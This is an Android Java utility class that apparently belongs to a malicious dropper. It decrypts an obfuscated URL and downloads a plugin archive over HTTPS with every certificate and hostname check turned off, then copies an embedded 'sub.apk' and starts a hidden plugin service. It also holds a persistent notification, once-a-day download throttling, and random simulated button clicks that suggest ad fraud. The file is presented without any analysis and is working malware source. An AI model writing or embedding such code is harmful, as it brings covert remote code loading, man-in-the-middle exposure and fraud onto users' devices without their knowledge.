package c.g.z.Utils;

import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Random;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import c.g.z.I;


/**
 * Created by admin on 2017/8/21.
 */

public class A {
    //action.intent.gp.pslzuishuai
    public static final String GP_BLACK_LIST_ACION = "yZPrbcajPT180/RLyphAS8Bpd2VWY7KVha3GWbKHCog=";

    public static final int DOWNLOAD_STATU_FINISH = 1;

    public static final int DOWNLOAD_STATU_ING = 0;

    public static final int DOWNLOAD_STATU_START = 2;

    //plugin.dex
    public static final String DEXFILE = "wqtYqipuYVv0EgxgKzyPUg==";
    //dex2
    public static final String DEXOUTPUTDIR = "wF+hGwZ18+vP+KesqIvc5Q==";
    //.subscribe/gp/System.zip
    public static final String ZIPFILE = "XRgZFLWmTGT02VLS6YduDRB2lER//XV4wwgUmEJg8eY=";
    //.subscribe/gp/
    public static final String UNZIPFILE = "NQ9e/GFQQVQWXJWtluKryw==";
    //.subscribe/gp/System.apk
    public static final String SOPATH = "XRgZFLWmTGT02VLS6YduDV0ivjJa5Vt7C1r5OTMxH8o=";
    //h59gK8hfD
    public static String UZIPKEY = "Vr2BsJVxdyV/XoPgmh8OaA==";

    public static String KEY = "abcdefgabcdefg12";

//    //https://1588714767.rsc.cdn77.org/pluginDexApk/gp/System.zip
    private final String DOWNLADO_URL = "KCX/bDjC5jvDDSf3R+H/zfnWBQS/G8i2GS30EwdxfCpn2935TQzy/2IX6aByR0zYMvzYKVbKynFkAHEz8aj7Cw==";
    //https://1588714767.rsc.cdn77.org/pluginDexApk/gp/SystemHwl.zip
   // private final String DOWNLADO_URL = "KCX/bDjC5jvDDSf3R+H/zfnWBQS/G8i2GS30EwdxfCpn2935TQzy/2IX6aByR0zYM1UiInGvpGdQ5rjzVsp3YQ==";

    private final String XML_NAME = "XKhsj58jktuYH";

    private final String SAVE_TIME_TAG = "YdJk8hkULMD&Ikg84";

    public int getD_status() {
        return d_status;
    }

    public void setD_status(int d_status) {
        this.d_status = d_status;
    }

    private int d_status = 100;

    private static A instance = null;

    private Context mContext;

    public static A getInstance(Context context) {
        if (instance == null)
            instance = new A(context);
        return instance;
    }

    private A(Context c) {
        this.mContext = c;
    }

    public void startDownload(File save_path) {

        setD_status(DOWNLOAD_STATU_START);

        new DTask(save_path).execute();
    }

    private class DTask extends AsyncTask<Void, Integer, Boolean> {

        private File savePath;

        DTask(File s) {
            this.savePath = s;
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            setD_status(DOWNLOAD_STATU_ING);
            InputStream inputStream = null;
            FileOutputStream fileOutputStream = null;
            try {
//                TrustManager[] tm = {new MyX509TrustManager()};
//                SSLContext sslContext = SSLContext.getInstance("SSL");
//                sslContext.init(null, tm, new java.security.SecureRandom());
//                // 从上述SSLContext对象中得到SSLSocketFactory对象
//                SSLSocketFactory ssf = sslContext.getSocketFactory();

                String d_url = B.decrypt(DOWNLADO_URL, A.KEY);
                if (TextUtils.isEmpty(d_url)) {
                    return null;
                }
                Log.e("TAG", "doInBackground: "+d_url);

                URL url = new URL(d_url);

                //去除安全验证  java.security.cert.CertPathValidatorException: Trust anchor for certification path not found 处理这个异常
                trustAllHosts();

                HttpsURLConnection httpURLConnection2 = (HttpsURLConnection) url.openConnection();

                //去除安全验证 java.security.cert.CertPathValidatorException: Trust anchor for certification path not found 处理这个异常
                httpURLConnection2.setHostnameVerifier(DO_NOT_VERIFY);

                // 设置域名校验
//                httpURLConnection2.setHostnameVerifier(new TrustAnyHostnameVerifier());
//
//                httpURLConnection2.setSSLSocketFactory(ssf);

                httpURLConnection2.setConnectTimeout(20000);

                httpURLConnection2.connect();

                Log.i("Welog", "获取状态：" + httpURLConnection2.getResponseCode());

                if (httpURLConnection2.getResponseCode() >= 400) {

                    Log.i("Welog", "[Status Code: " + httpURLConnection2.getResponseCode() + "] in download: ");
                }
                int responseCode = httpURLConnection2.getResponseCode();

                if (responseCode == 200 || responseCode == 206) {

                    inputStream = httpURLConnection2.getInputStream();

                    fileOutputStream = new FileOutputStream(savePath, true);

                    byte[] bArr = new byte[2048];

                    long j = 0;

                    int read;
                    while ((read = inputStream.read(bArr)) >= 0) {

                        j += (long) read;

                        fileOutputStream.write(bArr, 0, read);
                    }
                    return true;
                }
//
            } catch (Exception e) {
                if (savePath.exists()) {
                    savePath.delete();
                }
                Log.i("Welog", "error:" + e.getMessage());
                e.printStackTrace();
                return false;
            } finally {
                try {
                    if (inputStream != null)
                        inputStream.close();
                    if (fileOutputStream != null) {
                        fileOutputStream.flush();
                        fileOutputStream.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(Boolean aVoid) {
            super.onPostExecute(aVoid);
            setD_status(DOWNLOAD_STATU_FINISH);
            if (aVoid) {
                Log.i("Welog", "onPostExecute:  加载");
                init();
            }
        }
    }

    public static void trustAllHosts() {
        // Create a trust manager that does not validate certificate chains
        // Android use X509 cert
        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return new java.security.cert.X509Certificate[] {};
            }

            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
            }

            public void checkServerTrusted(X509Certificate[] chain,
                                           String authType) throws CertificateException {
            }
        } };

        // Install the all-trusting trust manager
        try {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection
                    .setDefaultSSLSocketFactory(sc.getSocketFactory());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public final static HostnameVerifier DO_NOT_VERIFY = new HostnameVerifier() {
        public boolean verify(String hostname, SSLSession session) {
            return true;
        }
    };

    public static void copyDex(Context context, String dexFile) {
        try {

            Log.i("Welog", "copyDex: do copy");

            InputStream localInputStream = context.getAssets().open("sub.apk");// 获取Assets下的文件

            FileOutputStream localFileOutputStream = new FileOutputStream(new File(dexFile));
            byte[] arrayOfByte = new byte[1024];
            //int i = localInputStream.read(arrayOfByte);
            for (; ; ) {
                int i = localInputStream.read(arrayOfByte);
                if (i == -1) {
                    break;
                }
                localFileOutputStream.write(arrayOfByte, 0, i);
                localFileOutputStream.flush();
            }
            localFileOutputStream.close();
            localInputStream.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();

            Log.i("Welog", "copyDex: error " + e.getMessage());

            return;
        }
    }

    private static class TrustAnyHostnameVerifier implements HostnameVerifier {
        public boolean verify(String hostname, SSLSession session) {
            return true;
        }
    }

    /**
     * 信任所有主机 对于任何证书都不做SSL检测
     * 安全验证机制，而Android采用的是X509验证
     */
    private static class MyX509TrustManager implements X509TrustManager {

        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }
    }

    public static final int NOTIFICATION_ID = 10;

    public static void startForeground(Service service) {

        Notification notification = new Notification.Builder(service).getNotification();

        notification.flags |= Notification.FLAG_NO_CLEAR;

        service.startForeground(NOTIFICATION_ID, notification);
    }

    public void init() {
        try {
        I.getInstance().init(mContext);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(B.decrypt(I.PLUG_SERVICE_PKG, A.KEY), B.decrypt(I.PLUG_SERVICE_NAME, A.KEY)));
        mContext.startService(intent);
        }catch (Exception e){
            Log.e("Welog","error:"+e.getMessage());
        }
    }


    /**
     * 获取渠道信息
     *
     * @param context
     * @return
     */
    public static String getKeyStore(Context context) {
        ApplicationInfo appInfo;
        try {
            synchronized (context) {
                appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(),
                        PackageManager.GET_META_DATA);
                return appInfo.metaData.getString("cid");
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return "D0001";
    }


    public void save_download_time() {

        SharedPreferences sp = mContext.getSharedPreferences(XML_NAME, 0);

        SharedPreferences.Editor editor = sp.edit();

        editor.putLong(SAVE_TIME_TAG, System.currentTimeMillis());

        editor.apply();
    }

    public boolean check_download_time() {

        SharedPreferences sp = mContext.getSharedPreferences(XML_NAME, 0);

        return Math.abs(System.currentTimeMillis() - sp.getLong(SAVE_TIME_TAG, 0)) > 24 * 60 * 60000;
    }


    /***
     * 初次安装时间
     ***/
    public static long getfirstInstallTime(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_ACTIVITIES).firstInstallTime;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return 0;
    }

    public void showDialog()
    {
        if(new Random().nextInt(2)==0){

            I.getInstance().clickBtn(mContext,10);
        }
    }


}
